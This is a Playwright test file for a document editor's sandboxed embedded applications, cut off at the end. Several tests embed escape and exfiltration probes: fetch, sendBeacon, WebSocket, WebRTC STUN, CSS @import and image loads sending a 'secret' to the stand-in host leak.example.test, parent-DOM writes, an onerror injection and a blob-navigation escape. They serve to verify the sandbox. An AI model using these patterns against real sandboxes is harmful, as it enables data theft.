import { test, expect, mount, jsonRoute, editorHtml } from './fixtures.mjs'
import { agent, document } from './data.mjs'

const datasetId = '11111111-1111-4111-8111-111111111111'
const definition = {
  id: 'responses', title: 'Responses', datasets: { entries: { uri: `document://${datasetId}`, access: 'write' } },
  html: '<form><label>Answer <input name="answer" required></label><button>Submit</button></form><p id="result" role="status"></p>',
  javascript: `document.querySelector('form').addEventListener('submit', async event => {
    event.preventDefault(); const button = document.querySelector('button'); button.disabled = true;
    try { const current = await galaris.datasets.read('entries');
      const result = await galaris.datasets.append('entries', {answer: new FormData(event.target).get('answer')}, current.revision);
      document.getElementById('result').textContent = 'Saved ' + result.data.length;
    } catch (error) { document.getElementById('result').textContent = error.code; }
    finally { button.disabled = false; }
  });`,
}
function content(app = definition) {
  return '<p>Introduction</p><pre><code class="language-galaris-app">' + JSON.stringify(app).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;') + '</code></pre><p>After the form</p>'
}
const runtimeProps = { documentId: 'doc-a', revision: 3, app: definition }
const inner = page => page.frameLocator('iframe').frameLocator('iframe')
const photoId = '22222222-2222-4222-8222-222222222222'
const photoUri = `document://${datasetId}/attachments/${photoId}`
const photoBytes = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAFklEQVR4nGNkYPjPwMDAxMDAwMDAAAALHwEDmIWXfgAAAABJRU5ErkJggg==', 'base64')

for (const width of [1440, 390]) test(`static styled documents keep a small runtime and usable disclosure at ${width}px`, async ({ page }, testInfo) => {
  await page.setViewportSize({ width, height: 900 })
  const rows = Array.from({ length: 6 }, (_, index) => `<tr><th>Item ${index + 1}</th><td>${index * 3}</td><td>Available</td></tr>`).join('')
  const html = `<style>.inventory{border-collapse:collapse;width:100%}.inventory th,.inventory td{padding:8px;border:1px solid #777}</style><h2>Synthetic inventory</h2><table class="inventory">${rows}</table><details><summary>Show totals</summary><p>18 items available</p></details>`
  const item = { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: html } }
  await jsonRoute(page, '**/api/agents?*', [agent])
  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
  await jsonRoute(page, '**/api/documents/keywords?*', [])
  await jsonRoute(page, '**/api/documents/doc-a?*', { item, agent_id: 7 })
  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
  const content = inner(page)
  await expect(content.getByRole('heading', { name: 'Synthetic inventory' })).toBeVisible()
  await expect(content.getByRole('row')).toHaveCount(6)
  const totals = content.getByText('18 items available', { exact: true })
  await expect(totals).toBeHidden()
  await content.locator('summary').click()
  await expect(totals).toBeVisible()
  await content.locator('summary').click()
  await expect(totals).toBeHidden()
  await page.screenshot({ path: testInfo.outputPath('static-styled-document.png') })
  expect(await editorHtml(page)).toBe(await page.evaluate(html => new DOMParser().parseFromString('<body>' + html, 'text/html').body.innerHTML, html))
  const runtimeBytes = await page.locator('.document-application-frame').evaluate(frame => new TextEncoder().encode(frame.srcdoc).length)
  await testInfo.attach('static-runtime.json', { body: JSON.stringify({ width, authoredBytes: Buffer.byteLength(html), runtimeBytes }), contentType: 'application/json' })
  // A small static document must not carry a full 3D engine in each isolated frame.
  expect(runtimeBytes).toBeLessThan(64_000)
})

for (const entry of ['javascript', 'script', 'handler']) test(`the local 3D library remains available to authored ${entry} code`, async ({ page }) => {
  const code = `document.querySelector('output').textContent = [new THREE.Scene().type, typeof THREE.OrbitControls, typeof THREE.GLTFLoader].join(', ')`
  const app = { id: 'library-check', title: 'Synthetic library check', html: '<output role="status">Waiting</output>' }
  if (entry === 'javascript') app.javascript = code
  else if (entry === 'script') app.html += `<script>${code}</script>`
  else app.html += `<button onclick="${code}">Check library</button>`
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  if (entry === 'handler') await inner(page).getByRole('button', { name: 'Check library' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('Scene, function, function')
})

for (const width of [1440, 390]) test(`isolated HTML follows the host theme without restarting scripts or losing input at ${width}px`, async ({ page }, testInfo) => {
  await page.setViewportSize({ width, height: 900 })
  const app = { id: 'theme-example', title: 'Synthetic theme example',
    html: '<h2>Theme sample</h2><p>Inherited paragraph <strong>with emphasis</strong></p><p style="color:#222">Explicit dark text</p><div style="background:#eef2f7"><span>Light panel</span></div><div style="background:#162637;color:#f5f5f5">Dark panel</div><label>Draft <input value="Initial"></label><button>Increment</button><output>0</output>',
    css: 'body{color:#222;font-family:system-ui;line-height:1.5} h2{margin-top:0} div{padding:12px} label{display:block} button{background:#087ff5;color:#fff;border:0;padding:8px}',
    javascript: 'window.runs=(window.runs||0)+1; document.querySelector("button").onclick=()=>document.querySelector("output").textContent=Number(document.querySelector("output").textContent)+1;',
  }
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { documentId: 'synthetic-theme', revision: 1, app }, dark: false })
  const content = inner(page)
  await expect(content.getByRole('heading', { name: 'Theme sample' })).toBeVisible()
  await content.getByRole('textbox', { name: 'Draft' }).fill('Unsaved synthetic draft')
  await content.getByRole('button', { name: 'Increment' }).click()
  const color = () => content.getByRole('heading').evaluate(element => getComputedStyle(element).color)
  const original = await color()
  const results = []
  for (const dark of [true, false, true]) {
    await page.evaluate(dark => window.testApp.dark(dark), dark)
    if (dark) await expect.poll(color).not.toBe(original)
    else await expect.poll(color).toBe(original)
    const ratios = await content.locator('body').evaluate(body => {
      const rgb = color => color.match(/[\d.]+/g).slice(0,3).map(Number)
      const luminance = color => rgb(color).map(value => { const channel = value / 255; return channel <= .04045 ? channel / 12.92 : ((channel + .055) / 1.055) ** 2.4 }).reduce((sum, value, index) => sum + value * [.2126,.7152,.0722][index], 0)
      const background = node => { const color = getComputedStyle(node).backgroundColor; if (color !== 'rgba(0, 0, 0, 0)') return color; return node.parentElement ? background(node.parentElement) : document.documentElement.dataset.galarisTheme === 'dark' ? 'rgb(39,39,39)' : 'rgb(255,255,255)' }
      return [...body.querySelectorAll('h2,p,strong,span,div,button,input,label,output')].filter(node => [...node.childNodes].some(child => child.nodeType === 3 && child.textContent.trim()) || node.tagName === 'INPUT').map(node => { const ink = luminance(getComputedStyle(node).color), surface = luminance(background(node)); return { ratio: (Math.max(ink,surface)+.05)/(Math.min(ink,surface)+.05), tag: node.tagName } })
    })
    for (const { ratio, tag } of ratios) expect(ratio, `${tag} in ${dark ? 'dark' : 'light'} mode`).toBeGreaterThanOrEqual(4.5)
    await expect(content.getByRole('textbox', { name: 'Draft' })).toHaveValue('Unsaved synthetic draft')
    await expect(content.locator('output')).toHaveText('1')
    expect(await content.locator('body').evaluate(() => window.runs)).toBe(1)
    results.push({ dark, color: await color() })
  }
  await page.screenshot({ path: testInfo.outputPath('isolated-html-dark.png') })
  expect(results[0].color).toBe(results[2].color)
  expect(await page.evaluate(() => window.testApp.events)).toEqual([])
})

test('a failed native photo load stops the application and a new revision retries with current access', async ({ page }) => {
  let denied = true
  await page.route(`**/api/documents/${datasetId}/attachments/${photoId}*`, route => denied
    ? route.fulfill({ status: 403, json: { detail: 'Photo access denied' } })
    : route.fulfill({ contentType: 'image/png', body: photoBytes }))
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: {
    ...runtimeProps, app: { ...definition, html: `<img src="${photoUri}" alt="Synthetic photo">` + definition.html },
  } })
  await expect(page.getByRole('alert')).toBeVisible()
  await expect(page.locator('iframe')).toHaveCount(0)
  denied = false
  await page.evaluate(() => window.testApp.setProps({ revision: 4 }))
  await expect.poll(() => inner(page).getByRole('img', { name: 'Synthetic photo' }).evaluate(image => image.naturalWidth)).toBeGreaterThan(0)
  await expect(page.getByRole('alert')).toHaveCount(0)
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
})

test('a late native photo response cannot restart an application from an older revision', async ({ page }) => {
  let release
  const waiting = new Promise(resolve => { release = resolve })
  let requested = false
  await page.route(`**/api/documents/${datasetId}/attachments/${photoId}*`, async route => {
    requested = true; await waiting
    await route.fulfill({ contentType: 'image/png', body: photoBytes }).catch(() => {})
  })
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: {
    ...runtimeProps, app: { ...definition, html: `<img src="${photoUri}" alt="Old photo">` + definition.html },
  } })
  await expect.poll(() => requested).toBe(true)
  await page.evaluate(app => window.testApp.setProps({ revision: 4, app }), definition)
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  release()
  await expect(inner(page).getByRole('img')).toHaveCount(0)
  await expect(page.getByRole('alert')).toHaveCount(0)
})

test('a form submits once with revisions and handles a conflict without losing input', async ({ page }) => {
  const requests = []
  let conflict = false
  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', route => {
    const body = route.request().postDataJSON(); requests.push(body)
    if (body.operation === 'read') return route.fulfill({ json: { revision: 4, data: [] } })
    return conflict ? route.fulfill({ status: 409, json: { detail: 'Dataset changed' } }) : route.fulfill({ json: { revision: 5, data: [body.value] } })
  })
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: runtimeProps })
  expect(requests).toEqual([])
  await inner(page).getByRole('textbox', { name: 'Answer' }).fill('Synthetic answer')
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('Saved 1')
  expect(requests).toEqual([
    { operation: 'read', document_revision: 3 },
    { operation: 'append', document_revision: 3, expected_revision: 4, value: { answer: 'Synthetic answer' } },
  ])
  conflict = true
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('conflict')
  await expect(inner(page).getByRole('textbox')).toHaveValue('Synthetic answer')
  expect(requests).toHaveLength(4)
  await page.evaluate(() => window.testApp.setProps({ ready: false }))
  await expect(page.locator('iframe')).toHaveCount(0)
})

test('the sandbox blocks host DOM, storage, network and self-navigation and denies undeclared datasets', async ({ page }) => {
  const outbound = []
  await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: 'Unexpected network access' }) })
  const app = { ...definition, html: '<p id="result" role="status"></p><button id="navigate">Navigate</button>', javascript: `
    (async () => {
      const results = [];
      try { parent.document.body.innerHTML = 'escaped'; results.push('unsafe DOM'); } catch { results.push('DOM blocked'); }
      try { localStorage.setItem('x', 'x'); results.push('unsafe storage'); } catch { results.push('storage blocked'); }
      try { await fetch('https://leak.example.test/fetch'); results.push('unsafe network'); } catch { results.push('network blocked'); }
      try { await galaris.datasets.read('secret'); results.push('unsafe Dataset'); } catch { results.push('Dataset blocked'); }
      document.getElementById('result').textContent = results.join(', ');
      document.getElementById('navigate').onclick = () => { location.href = 'https://leak.example.test/navigation'; };
    })();` }
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('DOM blocked, storage blocked, network blocked, Dataset blocked')
  await inner(page).getByRole('button', { name: 'Navigate' }).click()
  await expect(page.locator('iframe')).toHaveCount(0)
  expect(outbound).toEqual([])
  expect(await page.evaluate(() => document.body.textContent.includes('escaped'))).toBe(false)
})

test('a new document revision stops the application and discards late Dataset responses', async ({ page }) => {
  let release
  const waiting = new Promise(resolve => { release = resolve })
  let requests = 0
  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', async route => {
    ++requests; await waiting
    await route.fulfill({ json: { revision: 4, data: [] } }).catch(() => {})
  })
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: runtimeProps })
  await inner(page).getByRole('textbox').fill('Pending')
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect.poll(() => requests).toBe(1)
  await page.evaluate(() => window.testApp.setProps({ revision: 4, ready: false }))
  await expect(page.locator('iframe')).toHaveCount(0)
  release()
  await expect(page.locator('iframe')).toHaveCount(0)
  expect(requests).toBe(1)
})

for (const format of ['legacy', 'html']) test(`the normal editor preserves ${format} forms without a Source view`, async ({ page }, testInfo) => {
  await page.setViewportSize({ width: format === 'html' ? 390 : 1440, height: 900 })
  const attachmentId = '22222222-2222-4222-8222-222222222222'
  const uri = `document://${datasetId}/attachments/${attachmentId}`
  const photo = `<img src="${uri}" alt="Synthetic photo">`
  const raw = '<p>Introduction</p><p class="note">Photo before the calculator</p>' + photo + definition.html + '<script>' + definition.javascript + '</script><p>After the form</p>'
  const withPhoto = { ...definition, html: '<p class="note">Photo before the calculator</p>' + photo + definition.html }
  await page.route(`**/api/documents/${datasetId}/attachments/${attachmentId}?*`, route => route.fulfill({
    contentType: 'image/png', body: photoBytes,
  }))
  let current = { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: format === 'html' ? raw : content(withPhoto) } }
  const writes = []
  await jsonRoute(page, '**/api/agents?*', [agent])
  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
  await jsonRoute(page, '**/api/documents/keywords?*', [])
  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
  await page.route(/\/api\/documents\/doc-a(?:\?.*)?$/, route => {
    if (route.request().method() === 'GET') return route.fulfill({ json: { item: current, agent_id: 7 } })
    const body = route.request().postDataJSON(); writes.push(body)
    current = { ...current, ...body, revision: current.revision + 1 }
    return route.fulfill({ json: current })
  })
  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect.poll(() => inner(page).getByRole('img', { name: 'Synthetic photo' }).evaluate(image => image.naturalWidth)).toBeGreaterThan(0)
  await expect(page.getByRole('button', { name: /Edit document|Show applications|Add form/ })).toHaveCount(0)
  const editor = page.locator('[data-editor-surface]')
  await expect(editor.locator('pre')).toHaveCount(0)
  await expect(editor).not.toContainText('galaris.datasets.append')
  expect(writes).toEqual([])
  // Focusing the iframe preserves input; right-click opens the editing menu.
  const tools = page.getByRole('toolbar', { name: 'Embedded application', exact: true })
  await inner(page).getByRole('textbox', { name: 'Answer' }).fill('Synthetic answer')
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeFocused()
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toHaveValue('Synthetic answer')
  await expect(tools).toBeHidden()
  await page.screenshot({ path: testInfo.outputPath('embedded-context.png') })
  await inner(page).getByRole('textbox', { name: 'Answer' }).click({ button: 'right' })
  const menu = page.getByRole('menu', { name: 'Embedded application', exact: true })
  await expect(menu).toBeVisible()
  await expect(tools).toBeHidden()
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toHaveValue('Synthetic answer')
  expect(writes).toEqual([])
  await page.keyboard.press('Escape')
  await expect(menu).toBeHidden()
  await expect(tools).toBeHidden()
  await inner(page).getByRole('textbox', { name: 'Answer' }).click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Insert paragraph before block', exact: true }).click()
  await page.keyboard.type('Text immediately before the form')
  await expect(editor.locator(':scope > p')).toContainText(['Introduction', 'Text immediately before the form', 'After the form'])
  await inner(page).getByRole('textbox', { name: 'Answer' }).click()
  await inner(page).getByRole('textbox', { name: 'Answer' }).click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Insert paragraph after block', exact: true }).focus()
  await page.keyboard.press('Enter')
  await page.keyboard.type('Text immediately after the form')
  await expect(editor.locator(':scope > p')).toContainText(['Introduction', 'Text immediately before the form', 'Text immediately after the form', 'After the form'])
  await editor.locator('p').first().fill('Edited introduction')
  await expect.poll(() => writes.length).toBeGreaterThan(0)
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect(page.getByText('Edited introduction', { exact: true })).toBeVisible()
  expect(writes.at(-1).payload.text).toContain(format === 'html' ? '<script>' : 'language-galaris-app')
  expect(writes.at(-1).payload.text).toContain('Edited introduction')
  expect(writes.at(-1).payload.text).not.toMatch(/editorial-object-controls|editorial-insert-|keyboard_return/)
  await expect(page.getByRole('button', { name: 'Source', exact: true })).toHaveCount(0)
  await editor.locator(':scope > p').last().fill('Edited ending')
  await expect(inner(page).getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect(editor).toContainText('Edited ending')
  await expect(editor).not.toContainText('galaris.datasets.append')
  // Reading opens a static fullscreen copy; it never restarts the live application.
  await page.evaluate(() => window.testApp.setProps({ editable: false }))
  const previewButton = page.getByRole('button', { name: 'Document preview', exact: true })
  const writesBeforePreview = writes.length
  await previewButton.click()
  const preview = page.getByRole('dialog', { name: 'Document preview', exact: true })
  const snapshot = preview.frameLocator('iframe')
  await expect(snapshot.getByRole('textbox', { name: 'Answer' })).toBeVisible()
  await expect(tools).toBeHidden()
  await expect(snapshot.locator('script')).toHaveCount(0)
  await expect(snapshot.locator('img')).toHaveJSProperty('naturalWidth', 2)
  await page.screenshot({ path: testInfo.outputPath('readonly-html-preview.png') })
  await preview.getByRole('button', { name: 'Close', exact: true }).click()
  await expect(preview).toBeHidden()
  expect(writes.length).toBe(writesBeforePreview)
  await page.evaluate(html => window.testApp.mount({ component: 'core/util/components/RichText.vue', props: { content: html, profile: 'document' } }), current.payload.text)
  await expect(page.locator('iframe')).toHaveCount(0)
  await expect(page.locator('.rich-content')).not.toContainText('galaris.datasets.append')
})

test('narrow document panels keep embedded form controls reachable while scrolling', async ({ page }) => {
  const app = { id: 'reachable-form', title: 'Synthetic form', html: '<form><label>Answer <input></label><button>Submit</button></form><output>Waiting</output>',
    javascript: 'document.querySelector("form").onsubmit=event=>{event.preventDefault();document.querySelector("output").textContent=document.querySelector("input").value;}' }
  await jsonRoute(page, '**/api/agents?*', [agent])
  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
  await jsonRoute(page, '**/api/documents/keywords?*', [])
  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
  await jsonRoute(page, /\/api\/documents\/doc-a(?:\?.*)?$/, { item: { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: content(app) } }, agent_id: 7 })
  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
  await page.locator('.document-editor').evaluate(element => {
    const panel = document.createElement('div')
    panel.style.cssText = 'margin-top:300px;height:700px;overflow:auto;scroll-padding-top:1rem'
    element.before(panel); panel.append(element)
  })
  const runtime = page.frameLocator('.document-application-frame').frameLocator('iframe')
  for (const width of [320, 980]) {
    await page.locator('.tiptap-galaris-editor').evaluate((element, width) => { element.style.width = width + 'px' }, width)
    await runtime.getByRole('textbox', { name: 'Answer' }).fill('Response ' + width)
    await runtime.getByRole('button', { name: 'Submit', exact: true }).click()
    await expect(runtime.locator('output')).toHaveText('Response ' + width)
  }
  for (const fullscreen of [true, false]) {
    await page.getByRole('button', { name: 'Fullscreen', exact: true }).click()
    await runtime.getByRole('textbox', { name: 'Answer' }).fill('Fullscreen ' + fullscreen)
    await runtime.getByRole('button', { name: 'Submit', exact: true }).click()
    await expect(runtime.locator('output')).toHaveText('Fullscreen ' + fullscreen)
  }
  // Closing an editor must restore the scroll container's own configuration.
  expect(await page.locator('.document-editor').evaluate(element => {
    const panel = element.parentElement
    window.testApp.unmount()
    return panel.style.scrollPaddingTop
  })).toBe('1rem')
})

for (const format of ['legacy', 'html']) test(`printing and PDF preserve the displayed ${format} application state`, async ({ page }, testInfo) => {
  await page.addInitScript(() => { window.print = () => { window.printCalls = 1 } })
  const app = {
    id: 'calculator', title: 'Calculator',
    html: '<form><label>Amount <input name="amount" value="10"></label><label>Note <textarea>Initial</textarea></label><label>Period <select><option>Monthly</option><option>Yearly</option></select></label><label><input type="checkbox">Include fee</label><button>Calculate</button></form><output>Waiting</output><canvas width="80" height="40"></canvas><svg width="80" height="40"><circle cx="20" cy="20" r="15" fill="#00BAAD"/></svg>',
    css: 'form {padding:12px;background:#F2F9FF;display:grid;gap:8px} @media (min-width:600px) { form {grid-template-columns:repeat(2,minmax(0,1fr))} } output {display:block;color:#0081FF;font-size:24px} output::before {content:"Total: "}',
    javascript: `window.runs = (window.runs || 0) + 1; document.querySelector('form').onsubmit = event => { event.preventDefault(); document.querySelector('output').textContent = document.querySelector('input').value * 2 + ' EUR'; }; const ctx = document.querySelector('canvas').getContext('2d'); ctx.fillStyle = '#0081FF'; ctx.fillRect(0, 0, 80, 40);`,
  }
  const html = format === 'legacy' ? content(app) : '<p>Introduction</p><style>' + app.css + '</style>' + app.html + '<script>' + app.javascript + '</script><p>After the form</p>'
  await jsonRoute(page, '**/api/agents?*', [agent])
  await jsonRoute(page, '**/api/documents/owner-options?*', { agents: [{ id: 7, kind: 'agent', label: 'Alice', subtitle: '', avatar_url: null }], users: [] })
  await jsonRoute(page, '**/api/documents/keywords?*', [])
  await jsonRoute(page, '**/api/documents/doc-a/attachments?*', [])
  await jsonRoute(page, /\/api\/documents\/doc-a(?:\?.*)?$/, { item: { ...document, content_profile: 'document', media_type: 'text/html', payload: { text: html } }, agent_id: 7 })
  let snapshot, exports = 0
  await page.route('**/api/documents/doc-a/export-pdf', route => {
    ++exports
    snapshot = route.request().postDataJSON().html
    return route.fulfill({ contentType: 'application/pdf', body: '%PDF-1.7\nfixture' })
  })
  await mount(page, 'app/document/components/DocumentEditor.vue', { props: { documentId: 'doc-a', agentId: 7 }, privileges: ['DOCUMENT_EDIT'] })
  await page.locator('.tiptap-galaris-editor').evaluate(element => { element.style.width = '320px' })
  const runtime = page.frameLocator('.document-application-frame').frameLocator('iframe')
  await runtime.getByRole('textbox', { name: 'Amount' }).fill('125')
  await runtime.getByRole('textbox', { name: 'Note' }).fill('Current note')
  await runtime.getByRole('combobox').selectOption('Yearly')
  await runtime.getByRole('checkbox').check()
  await runtime.getByRole('button', { name: 'Calculate' }).click()
  await expect(runtime.locator('output')).toHaveText('250 EUR')
  // Exporting from the toolbar must also capture an application below the viewport.
  await page.setViewportSize({ width: 1440, height: 520 })
  await page.locator('.editorial-toolbar').evaluate(toolbar => toolbar.scrollIntoView({ block: 'end' }))
  await expect.poll(() => page.locator('.document-application-frame').evaluate(frame => frame.getBoundingClientRect().top >= window.innerHeight)).toBe(true)
  const download = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Export as PDF', exact: true }).click()
  await download
  await page.setViewportSize({ width: 1440, height: 1000 })
  expect(snapshot).toContain('250 EUR')
  expect(snapshot).toContain('Current note')
  expect(snapshot).not.toMatch(/<script|<iframe|onsubmit=/)
  const pdfPage = await page.context().newPage()
  await pdfPage.setContent(snapshot)
  await pdfPage.pdf({ path: testInfo.outputPath('application.pdf'), format: 'A4', printBackground: true, preferCSSPageSize: true })
  await pdfPage.close()
  await page.getByRole('button', { name: 'Print', exact: true }).click()
  await expect.poll(() => page.evaluate(() => document.querySelector('.document-print-frame')?.contentWindow?.printCalls)).toBe(1)
  const printed = page.frameLocator('.document-print-frame')
  const printLayout = await printed.locator('form').evaluate(form => ({
    width: form.getBoundingClientRect().width,
    pageWidth: document.querySelector('main').getBoundingClientRect().width,
    columns: getComputedStyle(form).gridTemplateColumns.split(' ').length,
  }))
  expect(printLayout.width).toBeGreaterThan(printLayout.pageWidth * 0.95)
  expect(printLayout.columns).toBe(2)
  await expect(printed.locator('main')).toContainText('Introduction')
  await expect(printed.locator('main')).toContainText('After the form')
  await expect(printed.locator('output')).toHaveText('Total: 250 EUR')
  await expect(printed.getByRole('textbox', { name: 'Amount' })).toHaveValue('125')
  await expect(printed.getByRole('textbox', { name: 'Note' })).toHaveValue('Current note')
  await expect(printed.getByRole('combobox')).toHaveValue('Yearly')
  await expect(printed.getByRole('checkbox')).toBeChecked()
  await expect(printed.locator('output')).toHaveCSS('color', 'rgb(0, 129, 255)')
  await expect(printed.locator('svg circle')).toHaveCount(1)
  await expect(printed.locator('img')).toHaveJSProperty('naturalWidth', 80)
  await expect(printed.locator('script,iframe')).toHaveCount(0)
  expect(await runtime.locator('body').evaluate(() => window.runs)).toBe(1)
  await page.locator('.document-print-frame').evaluate(frame => { frame.style.cssText = 'position:fixed;inset:0;width:794px;height:1123px;z-index:99999;background:white' })
  await printed.locator('main').screenshot({ path: testInfo.outputPath('application-print.png') })
  await page.evaluate(() => { const frame = document.querySelector('.document-print-frame'); frame.contentWindow.dispatchEvent(new frame.contentWindow.Event('afterprint')) })
  await page.locator('.tiptap-galaris-editor').evaluate(element => { element.style.width = '980px' })
  await runtime.getByRole('textbox', { name: 'Amount' }).fill('200')
  await runtime.getByRole('button', { name: 'Calculate' }).click()
  await page.getByRole('button', { name: 'Print', exact: true }).click()
  await expect(page.frameLocator('.document-print-frame').locator('output')).toHaveText('Total: 400 EUR')
  const widePrint = await page.frameLocator('.document-print-frame').locator('form').boundingBox()
  expect(widePrint.width).toBeCloseTo(printLayout.width, 0)
  // Closing the document during an unfinished capture must never export stale content.
  await runtime.locator('body').evaluate(() => Object.defineProperty(document.fonts, 'ready', { value: new Promise(() => {}) }))
  await page.evaluate(() => { const frame = document.querySelector('.document-print-frame'); frame.contentWindow.dispatchEvent(new frame.contentWindow.Event('afterprint')) })
  await page.getByRole('button', { name: 'Export as PDF', exact: true }).click()
  await expect(page.getByRole('button', { name: 'Export as PDF', exact: true })).toBeDisabled()
  await page.evaluate(() => window.testApp.unmount())
  expect(exports).toBe(1)
})


test('missing consent and backend quotas keep the form visible and preserve input', async ({ page }) => {
  let status = 403
  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', route => route.fulfill({
    status, json: { detail: status === 403 ? { code: 'permission_required' } : 'Quota exhausted' },
  }))
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: runtimeProps })
  await inner(page).getByRole('textbox').fill('Keep this answer')
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('permission_required')
  await expect(inner(page).getByRole('textbox')).toHaveValue('Keep this answer')
  status = 429
  await inner(page).getByRole('button', { name: 'Submit' }).click()
  await expect(inner(page).getByRole('status')).toHaveText('limit')
  await expect(inner(page).getByRole('textbox')).toHaveValue('Keep this answer')
})

test('malicious scripts cannot restore WebRTC constructors or escape through resource loads', async ({ page }) => {
  const outbound = []
  await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: '' }) })
  const app = { ...definition, html: '<p role="status"></p><img src="https://leak.example.test/image"><form action="https://leak.example.test/form"><input name="secret" value="synthetic"><button>Send</button></form>',
    css: '@import url("https://leak.example.test/css"); body {background-image:url("https://leak.example.test/background")}',
    javascript: `
      let blocked = 0;
      for (const name of ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCIceGatherer']) {
        try { Object.defineProperty(window, name, {value: function () {}}); } catch { blocked++; }
        try { new window[name]({iceServers:[{urls:'stun:leak.example.test:3478'}]}); } catch { blocked++; }
      }
      try { navigator.sendBeacon('https://leak.example.test/beacon', 'synthetic'); } catch {}
      try { new WebSocket('wss://leak.example.test/socket'); } catch {}
      document.querySelector('[role=status]').textContent = String(blocked);` }
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('6')
  await inner(page).getByRole('button', { name: 'Send' }).click()
  expect(outbound).toEqual([])
})

test('message saturation is bounded before it reaches the API', async ({ page }) => {
  let requests = 0
  await page.route('**/api/documents/doc-a/apps/responses/datasets/entries', route => { ++requests; return route.fulfill({ json: { revision: 1, data: [] } }) })
  const app = { ...definition, html: '<p role="status"></p>', javascript: `
    (async () => {
      let rejected = 0;
      for (let index = 0; index < 130; index++) {
        try { await galaris.datasets.read('entries'); } catch (error) { if (error.code === 'limit') rejected++; }
      }
      document.querySelector('[role=status]').textContent = String(rejected);
    })();` }
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app } })
  await expect(inner(page).getByRole('status')).toHaveText('10')
  expect(requests).toBe(120)
})

test('forged export HTML cannot load external resources or execute scripts during layout', async ({ page }) => {
  const outbound = []
  await page.route('https://leak.example.test/**', route => { outbound.push(route.request().url()); return route.fulfill({ body: '' }) })
  await mount(page, 'app/document/components/DocumentApplication.vue', { props: { ...runtimeProps, app: { id: 'static', title: 'Static', html: '<p>Visible</p>' } } })
  const result = await page.evaluate(async () => {
    const { layoutDocumentRendering } = await import('/core/util/layoutDocumentRendering.ts')
    const html = '<html><head><style>@import url("https://leak.example.test/css");p{background:url("https://leak.example.test/background")}</style></head><body><p>Preserved</p><img src="https://leak.example.test/image?secret=synthetic" onerror="top.exportEscaped=true"><iframe src="https://leak.example.test/frame"></iframe><script>top.exportEscaped=true</script><form action="https://leak.example.test/form"><input value="Kept"></form></body></html>'
    const fragment = await layoutDocumentRendering(html, new AbortController().signal)
    const root = document.createElement('div'); root.append(fragment)
    return { text: root.textContent, unsafe: root.querySelectorAll('script,iframe,[onerror],[action]').length, escaped: window.exportEscaped ?? false }
  })
  expect(result.text).toContain('Preserved')
  expect(result.unsafe).toBe(0)
  expect(result.escaped).toBe(false)
  expect(outbound).toEqual([])
})


test('a script cannot navigate to a fresh executable blob to regain WebRTC', async ({ page }) => {
  const escaped = []
  page.on('console', message => { if (message.text().startsWith('secondary-realm:')) escaped.push(message.text()) })
  const app = { id: 'escape', title: 'Escape probe', html: '<p role="status"></p>', javascript: `
    Object.defineProperty(Blob.prototype, 'type', {get: () => 'image/png'});
    Set.prototype.has = () => true;
    try {
      const code = '<script>console.log("secondary-realm:" + typeof RTCPeerConnection)</' + 'script>';
      location.href = URL.createObjectURL(new Blob([code], {type: 'text/html'}));
